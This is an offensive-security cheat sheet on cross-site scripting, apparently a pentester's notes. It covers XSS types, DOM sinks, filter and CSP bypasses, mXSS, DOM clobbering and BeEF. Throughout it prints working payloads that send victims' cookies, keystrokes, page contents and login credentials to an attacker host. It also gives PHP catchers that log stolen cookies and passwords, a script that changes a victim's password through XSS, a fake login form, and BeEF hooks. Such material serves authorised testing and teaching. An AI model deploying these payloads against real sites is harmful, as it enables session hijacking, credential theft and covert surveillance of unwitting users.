# Cross-Site Scripting (XSS)

#XSS #CrossSiteScripting #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS #mXSS #DOMClobbering #PrototypePollution #CSPBypass #XSStrike #dalfox #XSSHunter #BurpSuite #BeEF #ffuf

## What is this?

Web app fails to sanitize user input, allowing injection of JavaScript that executes in other users' browsers. Impact ranges from cookie theft and session hijacking to full account takeover. The attack targets the **client** (victim's browser), not the server.

> [!note] Protocol reference — how the browser parses HTML into the DOM and *why* input becomes script (injection contexts, mXSS): [[Standards & Protocols/HTML|HTML]].

**Vulnerable code:** `element.innerHTML = userInput;` or server rendering `<p>Hello, <?= $name ?></p>`

> [!tip] **Prove it with `alert(document.domain)` or `alert(window.origin)`, not `alert(1)`.** The popup shows *which origin* the script runs in, and a sandboxed or user-content domain (`*.googleusercontent.com`-style) is usually out of scope. Chrome ≥92 suppresses `alert()` in **cross-origin iframes**, so a silent payload in a framed widget may still be firing; use `print()` there.

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Web/XSStrike\|XSStrike]] | Smart XSS scanner — context-aware payload generation |
| [[Tools/Web/dalfox\|dalfox]] | Fast XSS scanner — parameter analysis + PoC generation |
| [[Tools/Web/XSS Hunter\|XSS Hunter]] | Blind XSS callback service — captures cookies/DOM/screenshots |
| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept, test, and automate XSS discovery (+ DOM Invader) |
| [[Tools/Web/BeEF\|BeEF]] | Browser exploitation framework — post-XSS browser control |
| [[Tools/Scanning/ffuf\|ffuf]] | Fuzz parameters and payload lists |

---

## XSS Types

| Type | Where Payload Lives | Persistence | Severity |
|------|-------------------|-------------|----------|
| **Stored (Persistent)** | Server-side (DB, file) | Permanent until removed | Highest - hits every visitor |
| **Reflected** | URL parameter, reflected in response | Single request | Medium - requires victim to click link |
| **DOM-based** | Client-side JS reads it from the URL/DOM (a `#fragment` payload never reaches the server at all) | Single request | Medium - harder to detect server-side |
| **Blind** | Stored, but triggers in a different context (admin panel, logs) | Permanent | High - targets privileged users |

### Stored XSS

Payload saved to backend, executes when any user loads the page.

**Common locations:**
- Comment/forum fields
- User profile fields (display name, bio, about)
- File upload names
- Support tickets / feedback forms
- Chat messages

**Testing:**

```html
<!-- Drop in any user-controlled stored field -->
<script>alert(window.origin)</script>
<img src=x onerror=alert(document.cookie)>
```

### Reflected XSS

Payload in the request is echoed back in the response. Not stored.

**Common locations:**
- Search boxes (`?search=<payload>`)
- Error messages that reflect input
- URL parameters rendered on page
- Form inputs reflected in confirmation pages

**Testing:**

```bash
# Check if input is reflected in the response
curl -s "http://target.com/search?q=UNIQUE_STRING" | grep "UNIQUE_STRING"

# If reflected without encoding, try payload
http://target.com/search?q=<script>alert(1)</script>
```

### DOM-based XSS

Payload is processed by the page's own JavaScript, and the server never reflects it. A `?query` payload is still *sent* to the server (and lands in its logs). A `#fragment` payload never leaves the browser, so server-side WAFs and logs never see it, which makes it the stealthiest source.

**Sources (where attacker input enters):**
- `location.hash` (`#fragment`)
- `location.search` (`?param=value`)
- `location.href`
- `document.referrer`
- `window.name`
- `postMessage` data

**Sinks (where input gets executed):**
- `innerHTML` / `outerHTML`
- `document.write()` / `document.writeln()`
- `eval()` / `Function()`
- `setTimeout()` / `setInterval()` (with string args)
- `element.setAttribute()` (on event handlers)
- `insertAdjacentHTML()`, `Range.createContextualFragment()`, `iframe.srcdoc`
- Navigation sinks: `location = x`, `location.href`, `a.href`, `window.open(x)` — take a `javascript:` URL, no tag needed
- jQuery: `$()`, `.html()`, `.append()`, `.after()`/`.before()`/`.prepend()`

**Testing:**

```javascript
// Check URL fragment handling
http://target.com/page#<img src=x onerror=alert(1)>

// Check URL params used client-side — use an event-handler payload, NOT <script>:
// a <script> inserted via innerHTML never executes (HTML spec), so it gives a false negative
http://target.com/page?default=<img src=x onerror=alert(1)>

// Use browser DevTools console to trace
// Sources > Event Listener Breakpoints > Script > Script First Statement
```

> [!warning] **Modern browsers percent-encode `<`, `>`, `"` and space in `location.hash`/`location.search`.** The sink receives `%3Cimg...`, which is inert, unless the app calls `decodeURIComponent()`/`URLSearchParams` first. If the payload "doesn't fire", check what the source actually returns in the console before concluding the sink is safe.

### Framework sinks (React / Vue / Angular)

Frameworks auto-escape `{{ }}` / JSX text, so XSS lives in the **escape hatches**:

| Framework | Sink | Note |
|---|---|---|
| React | `dangerouslySetInnerHTML={{__html: x}}` | raw HTML — event-handler payloads |
| React | `<a href={x}>` | `javascript:` URLs: React 16.9+ only *warns*; React 19 blocks them |
| Vue | `v-html="x"`, `:href="x"` | `v-html` = innerHTML; `:href` takes `javascript:` |
| Angular 2+ | `bypassSecurityTrustHtml/Url/Script()` | `[innerHTML]` alone is sanitized; these turn it off |
| AngularJS 1.x | `{{ }}` in **server-rendered** templates | client-side template injection: `{{constructor.constructor('alert(1)')()}}` (sandbox removed in 1.6) |

Grep the bundle for these names. A source map (`*.js.map`) gives you the original component code.

### Blind XSS

Payload executes in a context you can't see (admin panel, log viewer, ticketing system).

**Testing:**

```html
<!-- Load external script that phones home when triggered -->
<script src="http://ATTACKER_IP:8001/xss.js"></script>
'"><script src="http://ATTACKER_IP:8001/xss.js"></script>
"><img src=x onerror="fetch('http://ATTACKER_IP:8001/?c='+document.cookie)">
```

**Callback server setup:**

```bash
# Simple listener (serves xss.js from the cwd AND logs every callback)
python3 -m http.server 8001

# Or use netcat (shows the raw request, incl. headers — but no file serving)
nc -lvnp 8001
```

**Common blind XSS targets:**
- Contact/support forms (admin reads them)
- User-Agent or Referer headers (logged and viewed)
- Order/checkout notes
- Error reporting systems
- Log aggregation dashboards

---

## XSS Discovery

### Manual Testing Approach

1. **Map input points** - every form field, URL parameter, header, cookie value
2. **Check reflection** - submit a unique string (`er2test123`), search response for it
3. **Identify context** - where does your input land? (HTML body, attribute, JS block, URL)
4. **Test for encoding** - submit `<>"'&` and check if they're encoded in the response
5. **Craft context-specific payload** - see injection contexts below
6. **Try filter bypasses** if basic payloads are blocked

### Injection Contexts

**Inside HTML body:**

```html
<!-- Input lands between tags -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Inside an HTML attribute:**

```html
<!-- Input lands in an attribute value -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```

**Inside JavaScript block:**

```javascript
// Input lands inside a JS string
';alert(1);//
'-alert(1)-'
\'-alert(1)//
</script><script>alert(1)</script>
```

**Inside URL/href attribute:**

```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Fuzz for XSS Parameters

```bash
# Find reflective parameters — MATCH on the canary appearing in the body (-mr),
# not "-fs 0", which only drops empty responses and flags every 200
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://target.com/?FUZZ=er2canary' -mr er2canary

# Fuzz with payloads against a known parameter — this shows which payloads come back
# UNENCODED; it can't tell you a payload executes. Confirm the hits in a browser.
ffuf -w /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -mr '<(img|svg|script)'
```

---

## Filter Bypasses

### Tag Blacklist Bypasses

When `<script>` is blocked:

```html
<!-- Event handlers on other tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
```

> [!note] The long `<math><mtext><table><mglyph>…` payloads you'll see in cheat-sheet lists aren't tag-blacklist bypasses. They're **mXSS against specific old sanitizer versions**. See the mXSS section.

### Non-Recursive Filter Bypass

Filter strips `<script>` once:

```html
<scr<script>ipt>alert(1)</scr</script>ipt>    <!-- filter strips the TAG <script> once -->
<scrscriptipt>alert(1)</scrscriptipt>          <!-- filter strips the WORD "script" once -->
```

### Case Manipulation

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Encoding Bypasses

```html
<!-- URL encoding — just transport encoding; only "bypasses" a filter that inspects the raw
     request before the server decodes it (e.g. a WAF matching on the literal string) -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML entities -->
<!-- CAVEAT: entity-encoding the TAG BRACKETS only works if the app DOUBLE-decodes
     (HTML-decodes before re-inserting/re-parsing). In a plain HTML-body sink the
     parser renders &#x3C; as literal "<" text — inert, no execution. -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
<!-- This one DOES work: in ATTRIBUTE context, entities are decoded, so onerror runs alert -->
<img src=x onerror="&#x61;lert(1)">

<!-- Unicode -->
<script>\u0061lert(1)</script>

<!-- Double encoding — only works if something downstream decodes a SECOND time
     (app calls urldecode() on an already-decoded param, or a proxy→app decode chain) -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Mixed -->
<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)">
```

### Quote/Parentheses Bypasses

```html
<!-- No quotes needed -->
<img src=x onerror=alert(1)>

<!-- Backticks instead of parentheses -->
<svg onload=alert`1`>
<img src=x onerror=confirm`1`>

<!-- No parentheses (throw + onerror) -->
<script>onerror=alert;throw 1</script>

<!-- Tagged templates pass a STRINGS ARRAY, not code: alert`document.cookie` pops the
     literal text "document.cookie". To run an expression without parens, hand the string to
     something that evals it — setTimeout stringifies the array, \x28/\x29 are ( ) -->
<script>setTimeout`alert\x28document.cookie\x29`</script>
```

### Space Bypasses

```html
<!-- Use / instead of space — after the tag name, or after a QUOTED value.
     NOT after an unquoted value: <img/src=x/onerror=alert(1)> parses as
     src="x/onerror=alert(1)" with no handler (verified: html5lib + headless Chromium) -->
<img/src="x"/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Tab or newline -->
<img%09src=x%09onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
```

### JavaScript Protocol

```html
<a href="javascript:alert(1)">click</a>
<a href="JaVaScRiPt:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><button>submit</button></form>
```

### Polyglot Payloads

One payload that works in multiple contexts:

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Simpler polyglots -->
"><script>alert(1)</script>
"><svg/onload=confirm`XSS`>
"><img src=x onerror=prompt(1)>
'"><img src=x onerror=alert(1)>
```

### XSS → CSRF (Perform Actions as Victim)

XSS bypasses CSRF protections because the attacker's JS runs in the victim's browser origin, has access to CSRF tokens in the DOM, and sends requests with the victim's cookies automatically.

```javascript
// 1. Read CSRF token from meta tag or form
var token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
// or: document.querySelector('input[name="_token"]').value

// 2. Submit state-changing request with victim's session + CSRF token
fetch('/api/account/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': token
  },
  body: JSON.stringify({new_password: 'attacker123'})
}).then(r => new Image().src = 'http://ATTACKER_IP:8001/?done=' + r.status);
```

> [!tip] This defeats CSRF defenses completely — the token is valid, the cookie is present, the origin is correct. Document this as "CSRF Bypass via XSS" in findings.

### Bypassing HttpOnly Cookies

When cookies have `HttpOnly` flag (can't access via `document.cookie`):

```javascript
// Can't steal cookies directly, but can still:
// 1. Read what the user can read, and act AS the user (CSRF-style via XSS)
fetch('/api/admin/users', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('http://ATTACKER_IP:8001/', {method: 'POST', mode: 'no-cors', body: d}));
// POST the body, don't GET ?data=btoa(d): btoa() THROWS on any non-Latin-1 char,
// and a whole page in a query string blows past URL length limits.
// Catch it with a listener that logs POST bodies (nc -lvnp 8001 works).

// 2. Capture keystrokes
document.onkeydown = function(e) {
  fetch('http://ATTACKER_IP:8001/?key=' + encodeURIComponent(e.key));
};

// 3. Grab the rendered DOM
fetch('http://ATTACKER_IP:8001/', {method: 'POST', mode: 'no-cors', body: document.documentElement.outerHTML});
```

---

## XSS Exploitation

### Cookie Stealing

**Basic payload:**

```javascript
// Redirect (visible to user)
document.location='http://ATTACKER_IP:8001/steal?c='+document.cookie;

// Image beacon (invisible)
new Image().src='http://ATTACKER_IP:8001/steal?c='+document.cookie;

// Fetch (invisible, modern)
fetch('http://ATTACKER_IP:8001/steal?c='+document.cookie);
```

**PHP cookie catcher (`index.php`):**

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```bash
# Start catcher
php -S 0.0.0.0:8001
```

> [!note] Wrap the cookie in `encodeURIComponent(document.cookie)` when building the URL. A raw cookie value containing `&`, `+` or `#` gets split or truncated at the listener.

### Session Hijacking

After stealing cookie, replay it:

```bash
# Use stolen cookie to access the app as victim
curl -b 'PHPSESSID=stolen_session_id' http://target.com/dashboard

# Or set in browser DevTools:
# Application > Cookies > Edit PHPSESSID value
# Or use Cookie-Editor extension
```

### Phishing via XSS (Login Stealing)

**Inject fake login form that posts creds to attacker:**

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP:8001><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();   // HTB lab's element id — swap for the target's real form/container
```

> [!note] `document.write()` only appends while the page is still parsing (an inline `<script>` in a reflected/stored sink). From an event handler that fires **after load**, it wipes the whole page. That's fine for a full fake page, but if you want to keep the site's look, inject the form with `document.body.innerHTML = ...` or `insertAdjacentHTML`.

**PHP credential catcher (`index.php`):**

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://target.com/login");
    fclose($file);
    exit();
}
?>
```

### Defacing

Change page appearance to demonstrate impact:

```javascript
// Background
document.body.style.background = "#141d2b";
document.body.background = "http://ATTACKER_IP:8001/background.jpg";

// Title
document.title = 'Page Defaced';

// Replace page content
document.getElementsByTagName('body')[0].innerHTML = '<center><h1>Defaced</h1></center>';

// Modify specific elements
document.getElementById("target").innerHTML = "Modified Content";
```

### Keylogging

```javascript
// Capture all keystrokes (keydown — keypress is deprecated and skips non-character keys)
document.onkeydown = function(e) {
  new Image().src = 'http://ATTACKER_IP:8001/log?key=' + encodeURIComponent(e.key);
};

// Capture form submissions
document.querySelectorAll('form').forEach(f => {
  f.addEventListener('submit', function() {
    var data = new FormData(f);
    var params = new URLSearchParams(data).toString();
    new Image().src = 'http://ATTACKER_IP:8001/log?' + params;
  });
});
```

---

## Blind XSS Testing

### Payload Delivery

Inject into fields you suspect are viewed by admins/staff:

```html
<!-- Script tag with callback -->
<script src="http://ATTACKER_IP:8001/xss.js"></script>

<!-- Multiple contexts -->
'"><script src="http://ATTACKER_IP:8001/xss.js"></script>
"><img src=x onerror="var s=document.createElement('script');s.src='http://ATTACKER_IP:8001/xss.js';document.body.appendChild(s);">

<!-- For fields that might strip script tags -->
<img src=x onerror="fetch('http://ATTACKER_IP:8001/?cookie='+document.cookie+'&url='+document.URL)">
```

### Blind XSS Callback Script (`xss.js`)

```javascript
// Grab everything useful and send it back — small fields in the URL, the DOM in a POST body
// (btoa() throws on non-Latin-1 text and a whole page won't fit in a query string)
var q = 'cookie=' + encodeURIComponent(document.cookie) +
        '&url=' + encodeURIComponent(document.URL);
fetch('http://ATTACKER_IP:8001/callback?' + q, {method: 'POST', mode: 'no-cors',
      body: document.documentElement.outerHTML});
```

### Tools for Blind XSS

- **XSS Hunter** - Hosted service, auto-captures screenshots + cookies + DOM when payload fires
- Self-hosted alternatives work too (just host your own callback JS + listener)

---

## DOM XSS Deep Dive

### Finding DOM XSS

**Grep for dangerous sinks in JS files:**

```bash
# Download and search JS files
curl -s http://target.com/app.js | grep -iE '(innerHTML|outerHTML|document\.write|eval\(|setTimeout|setInterval|\.html\(|\.append\()'

# Or in browser DevTools:
# Sources > Search across all files (Ctrl+Shift+F)
# Search for: innerHTML, document.write, eval, .html(
```

**Trace source to sink:**

1. Find user-controllable input (URL params, hash, referrer)
2. Follow the data through JS code
3. See if it reaches a dangerous sink without sanitization

### DOM XSS via jQuery

```javascript
// Vulnerable pattern - user input to jQuery selector
var hash = decodeURIComponent(location.hash.slice(1));
$(hash);  // hash = <img src=x onerror=alert(1)> → jQuery builds the element → fires
// Two conditions: (1) the app DECODES the hash — browsers return it as %3Cimg... (verified
// in Chromium), and (2) jQuery ≥1.9 only treats the string as HTML if it STARTS with "<".
// Older jQuery (<1.9) parsed HTML anywhere after a "#", so $(location.hash) alone was enough.

// Vulnerable .html() usage
$('#output').html(userInput);

// $.getJSON on an attacker-influenced URL: a "callback=?" in the URL silently switches
// jQuery to JSONP — it loads the URL as a <script>, so pointing it at your host = RCE-in-page
$.getJSON(userControlledUrl);   // userControlledUrl = //ATTACKER_IP:8001/x.js?callback=?
```

### postMessage Exploitation

When a page has a `message` event listener without an `origin` check, send a payload from an attacker-controlled page. A handler that *does* check but accepts the string `"null"` is equally exploitable from a sandboxed frame — see [[Null Origin Attacks#Sink 4 — `postMessage` Handlers]].

**Vulnerable code pattern:**

```javascript
// No origin check — attacker can send arbitrary data
window.addEventListener("message", function(e) {
    document.getElementById("output").innerHTML = e.data;  // sink
});
```

**Attacker page exploit:**

```html
<iframe src="http://target.com/page" id="frame"></iframe>
<script>
  document.getElementById("frame").onload = function() {
    this.contentWindow.postMessage("<img src=x onerror=alert(document.domain)>", "*");
  };
</script>
```

> [!tip] Detection: search JS files for `addEventListener("message"` and check if `e.origin` is validated before the data is used. Also watch for *weak* checks: `e.origin.indexOf('target.com')` and `startsWith('https://target.com')` both pass for `https://target.com.attacker.net`.

> [!warning] **The iframe delivery fails if the target sends `X-Frame-Options` or `frame-ancestors`.** In that case keep a window reference instead: `w = window.open('http://target.com/page'); setTimeout(() => w.postMessage(payload, '*'), 2000)`. A popup needs a user click on your page to get past the popup blocker.

### DOM Invader (Burp)

Built into Burp's embedded browser. Automatically:
- Identifies sources and sinks
- Tests for DOM XSS
- Traces data flow through JavaScript
- Canary-based detection

---

## Mutation XSS (mXSS) & Sanitizer Bypasses

When the app *does* sanitize properly, the remaining attack is the gap between what the sanitizer parsed and what the browser re-parses on insertion. Feed markup that is inert to the sanitizer's parser but **mutates** into executable markup once the browser re-serialises it into the live DOM.

**Where mutation happens:**

| Trigger | Why it mutates |
|---|---|
| Foreign-content boundaries (`<svg>`, `<math>`) | HTML/SVG/MathML parsing rules differ — namespace confusion re-interprets tags on re-parse |
| Sanitized string re-assigned to `innerHTML` | Second parse of an already-serialised tree can produce a different tree |
| `<template>` content | Contents are parsed into a separate document fragment with different rules |
| `noscript` / `style` / `xmp` raw-text elements | Content treated as text in one context, markup in another |

```html
<!-- Namespace-confusion shape (classic DOMPurify <=2.0.16 mXSS) -->
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">

<!-- Form/template re-parse shape (DOMPurify 2.2.2-era bypass) -->
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

> [!warning] These are **historical, version-pinned** payloads. Both were fixed years ago, and current DOMPurify (3.x) neutralises them. Use them to confirm an *old* bundled sanitizer, not as a general bypass. The real work is the version check below.

**Named DOMPurify CVEs worth version-checking** (all checked against the cure53/DOMPurify GitHub advisories):

| CVE / GHSA | Affects | Condition |
|---|---|---|
| CVE-2025-26791 | `< 3.2.4` | Bad template-literal regex when `SAFE_FOR_TEMPLATES: true` → mXSS |
| CVE-2026-49978 (GHSA-rp9w-3fw7-7cwq) | fixed in **3.4.7** | `IN_PLACE` sanitization bypass via a shadow root attached inside `<template>.content` |
| CVE-2026-49458 (GHSA-hpcv-96wg-7vj8) | 3.x `IN_PLACE` | Cross-realm `IN_PLACE` bypass: realm-bound `instanceof` checks miss nodes from another frame |
| GHSA-gvmj-g25r-r7wr (2026) | 3.x | Another `SAFE_FOR_TEMPLATES` bypass: template expressions survive sanitization |

The 2026 advisory run is mostly **`IN_PLACE` mode and hooks** (`afterSanitize`/`uponSanitize` hooks that remove nodes or mutate `allowedTags`). Grep the app's DOMPurify call for `IN_PLACE`, `addHook` and `setConfig` before anything else.

```bash
# Always fingerprint the sanitizer version first — this is the whole attack
curl -s http://target.com/app.js | grep -oiE 'dompurify[^"]{0,40}'
# or in the browser console:
DOMPurify.version
```

> [!tip] Two config red flags to grep for regardless of version: `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true`. Also look for the app mutating DOMPurify's output *after* sanitizing (string concat, re-assignment to `innerHTML`) — that reintroduces the mutation the library just prevented.

> [!note] **Trusted Types** (`require-trusted-types-for 'script'` in CSP) is the platform-level fix. Raw strings can no longer reach `innerHTML`/`eval`/`script.src`; only objects minted by a named **policy** can. It isn't automatically game over, though:
> - **Read the policies.** Grep for `trustedTypes.createPolicy`. A `default` policy or a `createHTML: s => s` passthrough re-opens every sink, and many apps ship one "temporarily".
> - **Check it's enforced.** `Content-Security-Policy-Report-Only` only reports, so nothing is blocked.
> - **Check the browser.** Support arrived in Chromium first; on a browser without it, the header does nothing.
> - **Navigation sinks aren't covered.** `javascript:` in `location`/`href` is a different control.
>
> If it's enforced with tight policies, pivot to server-side reflected/stored contexts.

---

## DOM Clobbering (HTML-only, no script)

The technique for when the sanitizer strips every script vector but **allows `id` and `name` attributes** (DOMPurify does by default) — and no CSP nonce would help you anyway, because **you never execute script**. Instead you inject named HTML elements that **clobber** the global variables the app's own JavaScript reads, turning attacker-controlled markup into attacker-controlled *data* that the app then feeds to a sink.

**Why it works:** the browser auto-creates global references from element `id`/`name`:

```html
<a id=x></a>
<script>x           // === the <a> element — named access on WINDOW via any id
document.x          // undefined! named access on DOCUMENT only covers <img>/<form>/<iframe>/
                    // <embed>/<object> by name (+ img/object by id) — verified in Chromium
</script>
```

An app that guards on a global it *assumes* only its own code sets is subvertible:

```javascript
// 🚩 app code
if (window.config && window.config.url) {
  let s = document.createElement('script');
  s.src = window.config.url;      // if we control config.url → we load our JS
  document.body.append(s);
}
```

### Payload building blocks

```html
<!-- 1. Truthiness / presence clobber — satisfy an "if (window.X)" guard -->
<a id=x>

<!-- 2. Control a STRING the app reads — an <a>'s toString() returns its href -->
<a id=x href="https://attacker/evil.js">
<!-- String(window.x) === "https://attacker/evil.js"  → feeds config.url etc. -->

<!-- 3. Nested property (window.config.url) — two elements + HTMLCollection -->
<a id=config><a id=config name=url href="https://attacker/evil.js">
<!-- window.config is now an HTMLCollection; window.config.url resolves to the 2nd <a> -->

<!-- 4. form gives named access to its controls -->
<form id=config><input name=url value="https://attacker/evil.js"></form>
<!-- window.config.url === the input element — String() gives "[object HTMLInputElement]",
     so this only works if the app reads .value (verified in Chromium) -->
```

> [!warning] **DOMPurify's default `SANITIZE_DOM: true`** strips `id`/`name` values that would clobber **built-in** `document`/`form` properties (`id=cookie`, `name=getElementById`, `name=attributes`). Arbitrary app globals like `window.config` aren't built-ins, so they still clobber. Its `SANITIZE_NAMED_PROPS: true` option (off by default) kills clobbering entirely by prefixing every `id`/`name` with `user-content-`.

> [!tip] **Reach for this when:** you have HTML injection that survives DOMPurify (script/event handlers stripped, but the markup lands in the page) **and** the page's JS reads a config/flag/URL off `window.*` or `document.*`. It defeats a strict CSP because there is no inline or remote script *in your payload* — the app's own trusted code does the dangerous thing with your clobbered value. Common escalations: overwrite a `defaultAvatar`/`logoURL`/`config.api` that later becomes a `script.src` or `innerHTML`, or clobber `document.getElementById('...')`-fetched nodes.

> [!note] **Defence tells (for reading code):** the app is safe if it uses `let`/`const` globals (not clobberable), reads config from a JSON/`data-*` attribute via `JSON.parse`, or type-checks with `instanceof HTMLElement` before use. Clobbering only bites plain `var`/implicit globals and property lookups on them.

### Related: client-side prototype pollution → XSS

Same "HTML/data, not script" spirit at the JS layer: if a client-side merge/parse writes attacker keys into `Object.prototype` (`?__proto__[x]=y`, or a polluted JSON body), a later **gadget** that reads an unset property (`config.transport_url`, `sanitizer.ALLOWED_ATTR`) picks up your polluted value and reaches a sink. Find gadgets with **DOM Invader → Attack types → Prototype pollution** (switch it on in the extension's settings; it tests `__proto__` sources and then offers *Scan for gadgets*). Fixes: `Object.freeze(Object.prototype)`, null-proto objects, key blocklists.

---

## CSP (Content Security Policy) Considerations

### Checking CSP

```bash
# Check response headers
curl -sI http://target.com | grep -i content-security-policy

# Common CSP that blocks inline scripts
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### CSP Bypass Techniques

```html
<!-- If 'unsafe-inline' is set, inline scripts work -->
<script>alert(1)</script>

<!-- If a CDN hosting AngularJS is allowlisted, load it and use Angular's own evaluator.
     constructor.constructor('alert(1)')() builds a Function → needs 'unsafe-eval', so under a
     no-eval CSP use an event-directive gadget instead (PortSwigger AngularJS+CSP lab form;
     the #x in the URL focuses the input): -->
<script src="https://allowed-cdn.com/angular.min.js"></script>
<div ng-app ng-csp><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'></div>

<!-- JSONP endpoints on allowlisted domains — the callback param becomes script you control -->
<script src="https://allowed-domain.com/jsonp?callback=alert(1)//"></script>

<!-- base tag hijack (if base-uri not restricted) — it does NOT let you load your own
     <script src>: script-src 'self' still blocks the rebased attacker URL. It works against
     NONCE-based CSPs: the page's OWN nonced <script src="js/app.js"> tags AFTER your injection
     point resolve relative to your base → they load from you and carry a valid nonce -->
<base href="http://ATTACKER_IP:8001/">

<!-- If 'nonce' is used but static, predictable, leaked into the page, or cached
     (same nonce served from a CDN/proxy cache to every visitor) -->
<script nonce="leaked_nonce">alert(1)</script>
```

> [!tip] Paste the policy into **Google CSP Evaluator** (csp-evaluator.withgoogle.com). It flags known JSONP/Angular-hosting allowlist entries, missing `object-src`/`base-uri`, and `'unsafe-inline'` that's neutralised (or not) by a nonce/`'strict-dynamic'`.

### Dangling Markup Injection

When CSP blocks script execution entirely but doesn't restrict form actions, an unclosed tag exfiltrates subsequent page content (CSRF tokens, secrets) to an attacker-controlled server.

```html
<!-- 1. Unclosed form — following inputs (CSRF token etc.) join YOUR form. Needs the victim to
        submit it, and only works if no <form> is already open (nested <form> tags are ignored) -->
<form action="//ATTACKER_IP:8001/">

<!-- 2. Unclosed attribute — everything up to the next ' becomes part of the URL and is sent
        on load, no click needed. Chromium BLOCKS requests whose URL contains both a raw
        newline and "<", which kills this on most real pages; a single-line target or a
        non-Chromium victim browser still works -->
<img src='//ATTACKER_IP:8001/?leak=
```

**Useful when:**
- Script tags are blocked by CSP
- The page has hidden fields containing tokens/secrets rendered after the injection point
- `form-action` isn't set. It does **not** fall back to `default-src`, so `default-src 'self'` alone leaves form submissions open. For the `<img>` variant, `img-src` *does* fall back to `default-src`, so it needs a permissive `img-src`.

> [!note] What this buys you: you **steal** the CSRF token (and anything else rendered after the injection point) without running any script. The victim's browser sends the markup to you.

### When CSP Blocks Everything

**No script execution at all:**
- Dangling markup (above) to exfiltrate tokens
- CSS injection, if `style-src` allows your styles: attribute-selector exfil (`input[value^=a]{background:url(//ATTACKER_IP:8001/a)}`), leaking a token one character per request
- HTML-only gadgets: DOM clobbering (below), `<meta http-equiv="refresh" content="0;url=//ATTACKER_IP:8001/">` for phishing redirects

**Script runs, but `connect-src`/`img-src` block exfil:**
- **Navigate:** `location = '//ATTACKER_IP:8001/?c=' + encodeURIComponent(document.cookie)`. CSP doesn't govern top-level navigation (the proposed `navigate-to` was dropped).
- `window.open()` with the data in the URL works the same way.
- DNS prefetch / WebRTC side channels exist but are browser-dependent. Treat them as a last resort.

---

## BeEF (Browser Exploitation Framework)

Hook a victim's browser via XSS, then run modules from the BeEF UI.

```bash
# Start BeEF (Kali)
sudo beef-xss                     # Kali wrapper — prompts you to set a password on first run
# or: cd /usr/share/beef-xss && ./beef

# UI: http://127.0.0.1:3000/ui/panel
# config.yaml ships beef:beef, but BeEF REFUSES to start with the default creds — change them
```

**Hook payload — inject via XSS:**

```html
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

> [!warning] The hook is plain `http://`. On an **HTTPS** target page the browser blocks it as mixed content, so serve the hook over TLS (BeEF's `https` config block plus a cert) or it silently never loads.

**Useful BeEF modules post-hook:**

| Module | Path in BeEF UI |
|--------|----------------|
| Get cookies | Browser > Hooked Domain > Get Cookie |
| Keystrokes | No module needed — the hook's event logger records them; check the **Logs** tab |
| Redirect browser | Browser > Hooked Domain > Redirect Browser |
| Network scan | Network > Port Scanner |
| Webcam snap | Browser > Webcam |
| Fake login prompt | Social Engineering > Pretty Theft |

---

## SVG / HTML File Upload XSS

When a site accepts image uploads and serves SVG files directly, the browser renders them as HTML.

```xml
<!-- shell.svg -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
```

```xml
<!-- More powerful — load external script. An SVG document has NO document.body, and
     createElement('script') in an XML doc makes a non-executing element, so use SVG's own
     <script> with an href instead -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script xlink:href="http://ATTACKER_IP:8001/xss.js"/>
</svg>
```

```html
<!-- HTML file upload (if .html allowed) -->
<script>document.location='http://ATTACKER_IP:8001/steal?c='+encodeURIComponent(document.cookie)</script>
```

- Upload the file, navigate directly to its URL → XSS fires in victim's browser when they view it
- Combine with Stored XSS if the filename or link is rendered on another page

